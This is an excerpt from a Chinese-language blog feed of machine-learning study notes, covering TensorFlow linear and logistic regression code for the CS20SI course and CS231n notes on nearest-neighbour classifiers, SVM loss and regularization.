<p>二次函数的拟合需要改动多处代码。lecture 中并没有提出来，首先问题是 GradientDescentOptimizer 在此处并没有用，我试了一下，觉得 AdamOptimizer 是效果比较好的，当 learning_rate 是 0.001 时，最后的平均损失是 706.673181781，当 learning_rate 是 0.001 时，最后的平均损失是 596.339147409，深度学习真的和炼丹一样。</p>
</blockquote>
</blockquote>
<p>plt.scatter 也有个魔性的问题，好不容易解决了。这里附上完整代码</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span>
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
<span class="token keyword">import</span> xlrd

DATA_FILE <span class="token operator">=</span> <span class="token string">'data/fire_theft.xls'</span>

<span class="token comment" spellcheck="true"># Step 1: read in data from the .xls file</span>
<span class="token comment" spellcheck="true"># book = xlrd.open_workbook(DATA_FILE, encoding_override="utf-8")</span>
<span class="token comment" spellcheck="true"># sheet = book.sheet_by_index(0)</span>
<span class="token comment" spellcheck="true"># data = np.asarray([sheet.row_values(i) for i in range(1, sheet.nrows)])</span>
<span class="token comment" spellcheck="true"># n_samples = sheet.nrows - 1</span>
<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd  <span class="token comment" spellcheck="true"># 使用pandas更简便</span>
df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span>DATA_FILE<span class="token punctuation">)</span>
data <span class="token operator">=</span> df<span class="token punctuation">.</span>values
n_samples <span class="token operator">=</span> len<span class="token punctuation">(</span>df<span class="token punctuation">.</span>index<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 2: create placeholders for input X (number of fire) and label Y (number of theft)</span>
X <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'X'</span><span class="token punctuation">)</span>
Y <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 3: create weight and bias, initialized to 0</span>
w <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'weights_1'</span><span class="token punctuation">)</span>
u <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"weights_2"</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'bias'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 4: build model to predict Y</span>
Y_predicted <span class="token operator">=</span> X <span class="token operator">*</span> X <span class="token operator">*</span> w <span class="token operator">+</span> X <span class="token operator">*</span> u <span class="token operator">+</span> b

<span class="token comment" spellcheck="true"># Step 5: use the square error as the loss function</span>
loss <span class="token operator">=</span> tf<span class="token punctuation">.</span>square<span class="token punctuation">(</span>Y <span class="token operator">-</span> Y_predicted<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'loss'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 6: using gradient descent with learning rate of 0.01 to minimize loss</span>
optimizer <span class="token operator">=</span> tf<span class="token punctuation">.</span>train<span class="token punctuation">.</span>AdamOptimizer<span class="token punctuation">(</span>learning_rate<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minimize<span class="token punctuation">(</span>loss<span class="token punctuation">)</span>

<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># Step 7: initialize the necessary variables, in this case, w and b</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># writer = tf.summary.FileWriter('./my_graph/03/linear_reg', sess.graph)</span>

    <span class="token comment" spellcheck="true"># Step 8: train the model</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># train the model 100 times</span>
        total_loss <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># Session runs train_op and fetch values of loss</span>
            _<span class="token punctuation">,</span> l <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>optimizer<span class="token punctuation">,</span> loss<span class="token punctuation">]</span><span class="token punctuation">,</span> feed_dict<span class="token operator">=</span><span class="token punctuation">{</span>X<span class="token punctuation">:</span> x<span class="token punctuation">,</span> Y<span class="token punctuation">:</span>y<span class="token punctuation">}</span><span class="token punctuation">)</span>
            total_loss <span class="token operator">+=</span> l

        <span class="token keyword">print</span> <span class="token string">'Epoch {0}: {1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span> total_loss<span class="token operator">/</span>n_samples<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># close the writer when you're done using it</span>
    <span class="token comment" spellcheck="true"># writer.close()</span>

    <span class="token comment" spellcheck="true"># Step 9: output the values of w and b</span>
    w_value<span class="token punctuation">,</span> u_value<span class="token punctuation">,</span> b_value <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>w<span class="token punctuation">,</span> u<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># plot the results</span>
X<span class="token punctuation">,</span> Y <span class="token operator">=</span> data<span class="token punctuation">.</span>T<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>T<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> <span class="token string">'bo'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'Real data'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">,</span> X <span class="token operator">*</span> X <span class="token operator">*</span> w_value <span class="token operator">+</span> X <span class="token operator">*</span> u_value <span class="token operator">+</span> b_value<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'Predicted data'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h6 id="u5206_u6790_u4EE3_u7801"><a href="#u5206_u6790_u4EE3_u7801" class="headerlink" title="分析代码"></a>分析代码</h6><p>通过上面的程序会发现，在创建完优化器后，用 ‘sess.run(optimizer, feed_dict={X: x, Y: y})’ 来运行程序。实际上 TensorFlow 将所有操作作为图的一部分来运算，同时 feed_dict 作为输入的数据，而 loss 是根据 w 和 b 计算得到的，其实 TensorFlow 会根据 loss 来自动求梯度。</p>
<h5 id="u4F18_u5316_u5668_28Optimizers_29"><a href="#u4F18_u5316_u5668_28Optimizers_29" class="headerlink" title="优化器(Optimizers)"></a>优化器(Optimizers)</h5><p>GradientDescentOptimizer 表示更新规则是按照梯度下降的。TensorFlow 可以自动求导，更新权重和偏差来计算损失值。</p>
<p>优化器默认是训练所有目标函数的可训练变量，当然可以通过设置修改变量为不可训练型。比如以下的例子：</p>
<pre class=" language-python"><code class="language-python">global_step <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> trainable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>tf<span class="token punctuation">.</span>int32<span class="token punctuation">)</span>
learning_rate <span class="token operator">=</span> <span class="token number">0.01</span> <span class="token operator">*</span> <span class="token number">0.99</span> <span class="token operator">**</span> tf<span class="token punctuation">.</span>cast<span class="token punctuation">(</span>global_step<span class="token punctuation">,</span> tf<span class="token punctuation">.</span>float32<span class="token punctuation">)</span>
increment_step <span class="token operator">=</span> global_step<span class="token punctuation">.</span>assign_add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
optimizer <span class="token operator">=</span> tf<span class="token punctuation">.</span>GradientDescentOptimizer<span class="token punctuation">(</span>learning_rate<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># learning rate can be a tensor</span>
</code></pre>
<p>tf.Variable 类的完整定义如下：</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>initial_value<span class="token operator">=</span>None<span class="token punctuation">,</span> trainable<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> collections<span class="token operator">=</span>None<span class="token punctuation">,</span> 
            validate_shape<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> caching_device<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">,</span>
            variable_def<span class="token operator">=</span>None<span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> expected_shape<span class="token operator">=</span>None<span class="token punctuation">,</span> 
            import_scope<span class="token operator">=</span>None<span class="token punctuation">)</span>
</code></pre>
<h6 id="Optimizer_u5217_u8868"><a href="#Optimizer_u5217_u8868" class="headerlink" title="Optimizer列表"></a>Optimizer列表</h6><p>目前常见的有:</p>
<pre><code>tf.train.GradientDescentOptimizer 
tf.train.AdadeltaOptimizer 
tf.train.AdagradOptimizer 
tf.train.AdagradDAOptimizer 
tf.train.MomentumOptimizer 
tf.train.AdamOptimizer 
tf.train.FtrlOptimizer 
tf.train.ProximalGradientDescentOptimizer 
tf.train.ProximalAdagradOptimizer 
tf.train.RMSPropOptimizer
</code></pre><p>这上面的一些可以参考CS231n中的内容。</p>
<h3 id="TensorFlow__u903B_u8F91_u56DE_u5F52"><a href="#TensorFlow__u903B_u8F91_u56DE_u5F52" class="headerlink" title="TensorFlow 逻辑回归"></a>TensorFlow 逻辑回归</h3><p>逻辑回归也是很重要的，这里使用逻辑回归来对 MNIST 分类。</p>
<p>MNIST 是著名的手写数字数据集。其中每个图片是 28 x 28 像素，被平滑成大小为784的1维张量，每个图片都有一个标签。</p>
<p>使用 TF Learn 可以简洁的读取数据集，同时使用 One-hot 编码。 One-hot 编码 是只有一位是1其他都为0的数组。</p>
<p>以下的完整代码我并没有测试 括弧哭</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tensorflow<span class="token punctuation">.</span>examples<span class="token punctuation">.</span>tutorials<span class="token punctuation">.</span>mnist <span class="token keyword">import</span> input_data

MNIST <span class="token operator">=</span> input_data<span class="token punctuation">.</span>read_data_sets<span class="token punctuation">(</span><span class="token string">"/data/mnist"</span><span class="token punctuation">,</span> one_hot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
</code></pre>
<p>此时 MNIST 是一个对象，存放 55000 个训练数据和 10000 个测试数据，以及 5000 个验证集。</p>
<p>因为数据很大，所以为了加速训练，可以使用批量逻辑回归。首先修改 X_placeholder 和 Y_placeholder 的维度来适应 batch_size。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time
<span class="token keyword">import</span> numpy  <span class="token keyword">as</span>  np
<span class="token keyword">import</span> tensorflow  <span class="token keyword">as</span>  tf
<span class="token keyword">from</span>  tensorflow<span class="token punctuation">.</span>examples<span class="token punctuation">.</span>tutorials<span class="token punctuation">.</span>mnist <span class="token keyword">import</span> input_data

<span class="token comment" spellcheck="true"># Step 1: Read in data</span>
<span class="token comment" spellcheck="true"># using TF Learn's built in function to load MNIST data to the folder data/mnist</span>
MNIST <span class="token operator">=</span> input_data<span class="token punctuation">.</span>read_data_sets<span class="token punctuation">(</span><span class="token string">"/data/mnist"</span><span class="token punctuation">,</span> one_hot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># Step 2: Define parameters for the model</span>
learning_rate <span class="token operator">=</span> <span class="token number">0.01</span>
batch_size <span class="token operator">=</span> <span class="token number">128</span>
n_epochs <span class="token operator">=</span> <span class="token number">25</span>

<span class="token comment" spellcheck="true"># Step 3: create placeholders for features and labels</span>
<span class="token comment" spellcheck="true"># each image in the MNIST data is of shape 28*28 = 784</span>
<span class="token comment" spellcheck="true"># therefore, each image is represented with a 1x784 tensor</span>
<span class="token comment" spellcheck="true"># there are 10 classes for each image, corresponding to digits 0 - 9. # each label is one hot vector.</span>
X <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> <span class="token punctuation">[</span>batch_size<span class="token punctuation">,</span> <span class="token number">784</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
Y <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> <span class="token punctuation">[</span>batch_size<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 4: create weights and bias</span>
<span class="token comment" spellcheck="true"># w is initialized to random variables with mean of 0, stddev of 0.01</span>
<span class="token comment" spellcheck="true"># b is initialized to 0</span>
<span class="token comment" spellcheck="true"># shape of w depends on the dimension of X and Y so that Y = tf.matmul(X, w)</span>
<span class="token comment" spellcheck="true"># shape of b depends on Y</span>
w <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>random_normal<span class="token punctuation">(</span>shape<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">784</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stddev<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"weights"</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"bias"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 5: predict Y from X and w, b</span>
<span class="token comment" spellcheck="true"># the model that returns probability distribution of possible label of the image # through the softmax layer</span>
<span class="token comment" spellcheck="true"># a batch_size x 10 tensor that represents the possibility of the digits</span>
logits <span class="token operator">=</span> tf<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>X<span class="token punctuation">,</span> w<span class="token punctuation">)</span> <span class="token operator">+</span> b

<span class="token comment" spellcheck="true"># Step 6: define loss function</span>
<span class="token comment" spellcheck="true"># use softmax cross entropy with logits as the loss function</span>
<span class="token comment" spellcheck="true"># compute mean cross entropy, softmax is applied internally</span>
entropy <span class="token operator">=</span> tf<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>softmax_cross_entropy_with_logits<span class="token punctuation">(</span>logits<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>
loss <span class="token operator">=</span> tf<span class="token punctuation">.</span>reduce_mean<span class="token punctuation">(</span>entropy<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># computes the mean over examples in the batch</span>

<span class="token comment" spellcheck="true"># Step 7: define training op</span>
<span class="token comment" spellcheck="true"># using gradient descent with learning rate of 0.01 to minimize cost </span>
optimizer <span class="token operator">=</span> tf<span class="token punctuation">.</span>train<span class="token punctuation">.</span>GradientDescentOptimizer<span class="token punctuation">(</span>learning_rate<span class="token operator">=</span>learning_rate<span class="token punctuation">)</span><span class="token punctuation">.</span>minimize<span class="token punctuation">(</span>loss<span class="token punctuation">)</span>
init <span class="token operator">=</span> tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">with</span>  tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>init<span class="token punctuation">)</span>
    n_batches <span class="token operator">=</span> int<span class="token punctuation">(</span>MNIST<span class="token punctuation">.</span>train<span class="token punctuation">.</span>num_examples <span class="token operator">/</span> batch_size<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n_epochs<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># train the model n_epochs times</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>n_batches<span class="token punctuation">)</span><span class="token punctuation">:</span>
            X_batch<span class="token punctuation">,</span> Y_batch <span class="token operator">=</span> MNIST<span class="token punctuation">.</span>train<span class="token punctuation">.</span>next_batch<span class="token punctuation">(</span>batch_size<span class="token punctuation">)</span>
        sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>optimizer<span class="token punctuation">,</span> loss<span class="token punctuation">]</span><span class="token punctuation">,</span> feed_dict<span class="token operator">=</span><span class="token punctuation">{</span>X<span class="token punctuation">:</span> X_batch<span class="token punctuation">,</span> Y<span class="token punctuation">:</span> Y_batch<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># average loss should be around 0.35 after 25 epochs</span>

<span class="token comment" spellcheck="true"># test the model</span>
n_batches <span class="token operator">=</span> int<span class="token punctuation">(</span>MNIST<span class="token punctuation">.</span>test<span class="token punctuation">.</span>num_examples <span class="token operator">/</span> batch_size<span class="token punctuation">)</span>
total_correct_preds <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n_batches<span class="token punctuation">)</span><span class="token punctuation">:</span>
    X_batch<span class="token punctuation">,</span> Y_batch <span class="token operator">=</span> MNIST<span class="token punctuation">.</span>test<span class="token punctuation">.</span>next_batch<span class="token punctuation">(</span>batch_size<span class="token punctuation">)</span>
    _<span class="token punctuation">,</span> loss_batch<span class="token punctuation">,</span> logits_batch <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>optimizer<span class="token punctuation">,</span> loss<span class="token punctuation">,</span> logits<span class="token punctuation">]</span><span class="token punctuation">,</span> feed_dict<span class="token operator">=</span><span class="token punctuation">{</span>X<span class="token punctuation">:</span> X_batch<span class="token punctuation">,</span> Y<span class="token punctuation">:</span> Y_batch<span class="token punctuation">}</span><span class="token punctuation">)</span>
    preds <span class="token operator">=</span> tf<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>softmax<span class="token punctuation">(</span>logits_batch<span class="token punctuation">)</span>
    correct_preds <span class="token operator">=</span> tf<span class="token punctuation">.</span>equal<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>preds<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>Y_batch<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    accuracy <span class="token operator">=</span> tf<span class="token punctuation">.</span>reduce_sum<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>cast<span class="token punctuation">(</span>correct_preds<span class="token punctuation">,</span> tf<span class="token punctuation">.</span>float32<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># similar to numpy.count_nonzero(boolarray) :(</span>
    total_correct_preds <span class="token operator">+=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>accuracy<span class="token punctuation">)</span>
    <span class="token keyword">print</span>   <span class="token string">"Accuracy {0}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>total_correct_preds <span class="token operator">/</span> MNIST<span class="token punctuation">.</span>test<span class="token punctuation">.</span>num_examples<span class="token punctuation">)</span>
</code></pre>
<h5 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h5><p>lecture 3 学习了线性回归和逻辑回归，官方笔记里有一些坑，或多或少填完了这个坑，争取在考研的过程中能把这门可和cs229过一遍。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CS231n 回顾与思考(一)]]></title>
      <url>http://xinqiu.me/2017/02/10/CS231n-1/</url>
      <content type="html"><![CDATA[<blockquote>
<p>大三上学期突然入了深度学习的坑，明明还没从机器学习CS229的坑里爬出来就先放一边去了，有空还要去把机器学习的坑填上。当初学的时候忘了做笔记，因为做MIT6.828，结果CS231n有点忘了，现在来补一补笔记。</p>
</blockquote>
<h2 id="u56FE_u50CF_u5206_u7C7B"><a href="#u56FE_u50CF_u5206_u7C7B" class="headerlink" title="图像分类"></a>图像分类</h2><p>在学习 CS231n 的一开始，先介绍了图像分类的相关知识。首先图像一般是由3个颜色通道构成(红，绿，蓝)，所以一张图片一般是个三维数组。图像分类有很多挑战，常见的是图像的拍摄点存在不同，图像的大小，物体的变形，光照影响，和背景颜色类似，同一物体的多种外形等等。所以其中有一种最简单的思路——最近邻分类器。</p>
<a id="more"></a>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<h3 id="u6700_u8FD1_u90BB_u5206_u7C7B_u5668"><a href="#u6700_u8FD1_u90BB_u5206_u7C7B_u5668" class="headerlink" title="最近邻分类器"></a>最近邻分类器</h3><p>这是一个最基础的分类器。比如，使用 CIFAR-10 这个图像数据集，这个数据集是有 10 种类型的不同图片组成。训练集中每一类都有5000张不同图像，每张图片是32x32的大小。最近邻分类器的简单思路就是判断两张图片的近似程度。这里用到了一个公式 <strong>L1 distance</strong>:</p>
<p>$$ d_{1} (I_{1}, I_{2})=\sum_{p} \left| I^p_1 - I^p_2 \right| $$ </p>
<p>两个图片对于每个像素进行相减取绝对值，然后将这些值求和，得到整个图片的 L1 距离。以下是一个4x4的例子。</p>
<p><img src="http://cs231n.github.io/assets/nneg.jpeg" alt=""></p>
<p>对于要分类的那张未知类的图像，只需要求它与训练集里其他图像的 L1 距离，找到距离最近的图像，就认为未知类的图像是这个距离最近的图像的种类。</p>
<p>对于距离的选择，还有一个公式—— <strong>L2 distance</strong>:</p>
<p>$$ d_{1} (I_{1}, I_{2})= \sqrt{\sum_{p} \left( I^p_1 - I^p_2 \right)^2} $$</p>
<h3 id="KNN"><a href="#KNN" class="headerlink" title="KNN"></a>KNN</h3><p>KNN 思路是找出最相似的 k 个图片的标签，然后取这 k 个中相同标签最多的那个标签。上面的 NN 其实就是 k = 1 的情况。</p>
<iframe src="http://nbviewer.jupyter.org/github/xinqiu/learn-cs231n/blob/master/assignment1/knn.ipynb" width="100%" height="800" scrolling="yes"></iframe>

<h3 id="u9A8C_u8BC1_u96C6"><a href="#u9A8C_u8BC1_u96C6" class="headerlink" title="验证集"></a>验证集</h3><p>对于如何确定超参数，只能通过不停的调试。为了先确定超参数以便预测测试集，可以使用验证集的思路。在训练的时候，不能用测试集来训练模型参数，那样会过拟合。使用验证集的思路是:从训练集中选取一部分当做假的测试集，通过剩余的训练集来训练模型，与假的测试集进行计算准确度，准确度最高的那个超参数可以算是较为合适的超参数。</p>
<p>之后就有一种方法，交叉验证。这是将训练集均分为几份，其中一份为测试集，剩余的作为训练集进行训练，得出准确率。将这些准确率取平均值代表平均准确率。</p>
<h3 id="u7EBF_u6027_u5206_u7C7B_u5668"><a href="#u7EBF_u6027_u5206_u7C7B_u5668" class="headerlink" title="线性分类器"></a>线性分类器</h3><p>然而用 NN 来做图片分类还是太麻烦了，所以为了简化计算量，引入了评分函数和损失函数，用来量化图片分类与真实标签的相似程度。</p>
<p>线性分类器就是 </p>
<p>$$ f(x_i, W, b) =  W x_i + b $$</p>
<p>其中 $ x_i $ 是训练集中的图片，<strong>W</strong> 是权重， <strong>b</strong> 是偏移量。对于训练集中的每一张图片，都要它的真实标签 $y_i$。所以就变成需要靠训练集的训练来调出最合适的 W 和 b，使得这个线性分类器 f 能对任意输入的一个图片进行计算操作，得到一个预测的值，预测值与真实值越近越好。</p>
<p>用一张简单的图例就是 </p>
<p><img src="http://cs231n.github.io/assets/imagemap.jpg" alt=""></p>
<p>对于 W 和 b，有一个小技巧，是将 b 添加到 W 中去，使 W 多一列，这样可以简化运算。</p>
<p><img src="http://cs231n.github.io/assets/wb.jpeg" alt=""></p>
<p>以上内容也不是很难，下面才开始有点难度。</p>
<h3 id="u635F_u5931_u51FD_u6570"><a href="#u635F_u5931_u51FD_u6570" class="headerlink" title="损失函数"></a>损失函数</h3><p>上面提到了线性分类器，同样也算是损失函数的计算。只有当 W 和 b 是调好参数的时候，才能作为分类器，不然只能作为得分函数来看。所以 $ f(x_i, W, b) $ 也就是所谓的得分函数。对于得到的得分，需要一个损失函数来量化与正确值之间的差异程度。</p>
<h3 id="u591A_u7C7B_u652F_u6301_u5411_u91CF_u673A_u635F_u5931"><a href="#u591A_u7C7B_u652F_u6301_u5411_u91CF_u673A_u635F_u5931" class="headerlink" title="多类支持向量机损失"></a>多类支持向量机损失</h3><p>SVM的损失函数是在所有正确分类的得分和不正确分类的得分中确定出一个边界差 $\Delta$。之前提到过，第 $i$ 个数据包含图像 $x_i$ 的像素和代表正确标签的 $y_i$。就数据集 CIFAR-10 而言，类别有10种，所以 $ f(x_i, W, b) $ 计算能得出对于10个类的分别得分，正确的是在类 $i$ ，错误的类标签就是 $j$。那么对于第$j$类的得分就是第$j$个元素：$s_j = f(x_i, W)_j$。根据概念，可以得出 SVM 的损失函数</p>
<p>$$ L_{i} = \sum_{j\neq y_{i}} \max(0, s_{j} - s_{y_{i}} + \Delta) $$</p>
<p>这个函数简而言之就是给定超参数 $\Delta$ 后，所有错误类别的得分减正确类别得分加上 $\Delta$ 之和就是损失值。这里的 $max(0, -)$ 不能遗漏。$max$ 得 0 的意义代表取的超参数 $\Delta$ 是可行的，而不得 0 代表 $\Delta$ 还有点大。</p>
<p>所以使用线性得分函数 $(f(x_i; W) =  W x_i)$ 的 SVM 损失函数就是 </p>
<p>$$ L_{i}=\sum_{j\neq y_{i}} \max(0, w_{j}^{T} x_{i} - w_{y_{i}}^T x_{i} + \Delta)  $$</p>
<p>这里 $w_j$ 是 $W$ 的 第 $j$ 行变形得到的列向量。</p>
<p>所以 SVM 就是为了先计算出合适的 $\Delta$，之后就能用来分类了。下图描述了正确类与错误类之间的差距关系。</p>
<p><img src="http://cs231n.github.io/assets/margin.jpg" alt=""></p>
<h3 id="u6B63_u5219_u5316"><a href="#u6B63_u5219_u5316" class="headerlink" title="正则化"></a>正则化</h3><p>正则化，也就是regularization，是为了避免在训练权重的时候过拟合，这里算是历史原因导致的约定俗成。最常见的是 L2 范式。这是在原本的 Loss 函数后加上正则化惩罚函数，这个惩罚函数是</p>
<p>$$ R(W) = \sum_{k}\sum_{l} W_{k,l}^2 $$</p>
<p>所以完整的 SVM 函数就是</p>
<p>$$ L =  \underbrace{ \frac{1}{N} \sum_{i} L_{i} }_\text{data loss} + \underbrace{ \lambda R(W) }_\text{regularization loss} \\ $$</p>
<p>详细点就是</p>
<p>$$ L = \frac{1}{N} \sum_{i} \sum_{j\neq y_{i}} \left[ \max(0, f(x_{i}; W)_{j} - f(x_{i}; W)_{y_{i}} + \Delta) \right] + \lambda \sum_{k}\sum_{l} W_{k,l}^2 $$</p>
<p>这个 $ N $ 就是训练样本的数量。这里也有个超参数 $ \lambda $，当然可以和上面类似，用交叉验证来得到合适的值。</p>
<iframe src="http://nbviewer.jupyter.org/github/xinqiu/learn-cs231n/blob/master/assignment1/svm.ipynb" width="100%" height="800" scrolling="yes"></iframe>


]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Tensorflow for Deep Learning 2]]></title>
      <url>http://xinqiu.me/2017/02/02/cs20si-2/</url>
      <content type="html"><![CDATA[<blockquote>
<p>笔记2: TensorFlow Ops</p>
</blockquote>
<h3 id="u4F7F_u7528_TensorBoard"><a href="#u4F7F_u7528_TensorBoard" class="headerlink" title="使用 TensorBoard"></a>使用 TensorBoard</h3><p>TensorFlow 中将常量(constants),变量(variables),运算符(operators)合称为操作(ops)。TensorFlow 是由TensorFlow, TensorBoard, TensorServing 构成。首先介绍 TensorBoard。</p>
<p>TensorBoard 是图可视化软件。</p>
